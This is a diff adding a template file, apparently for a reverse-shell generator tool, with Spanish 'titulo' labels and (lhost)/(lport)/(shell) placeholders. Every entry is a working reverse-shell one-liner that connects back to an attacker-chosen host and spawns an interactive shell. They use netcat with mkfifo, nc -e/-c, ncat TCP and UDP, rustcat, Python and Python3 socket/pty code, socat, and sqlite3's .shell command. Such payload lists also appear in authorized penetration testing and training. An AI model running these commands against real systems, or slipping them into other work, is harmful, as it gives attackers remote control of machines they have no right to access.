@@ -1,0 +1,38 @@
+(titulo) nc mkfifo
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|(shell) -i 2>&1|nc (lhost) (lport) >/tmp/f
+
+(titulo) nc -e
+nc (lhost) (lport) -e (shell)
+
+(titulo) nc -c
+nc -c (shell) (lhost) (lport)
+
+(titulo) ncat -e
+ncat (lhost) (lport) -e (shell)
+
+(titulo) ncat udp
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|(shell) -i 2>&1|ncat -u (lhost) (lport) >/tmp/f
+
+(titulo) rustcat
+rcat (lhost) (lport) -r (shell)
+
+(titulo) Python #1
+export RHOST="(lhost)";export RPORT=(lport);python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("(shell)")'
+
+(titulo) Python #2
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("(lhost)",(lport)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("(shell)")'
+
+(titulo) Python3 #1
+export RHOST="(lhost)";export RPORT=(lport);python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("(shell)")'
+
+(titulo) Python3 #2
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("(lhost)",(lport)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("(shell)")'
+
+(titulo) socat #1
+socat TCP:(lhost):(lport) EXEC:(shell)
+
+(titulo) socat #2 (TTY)
+socat TCP:(lhost):(lport) EXEC:'(shell)',pty,stderr,setsid,sigint,sane
+
+(titulo) sqlite3 nc mkfifo
+sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|(shell) -i 2>&1|nc (lhost) (lport) >/tmp/f'
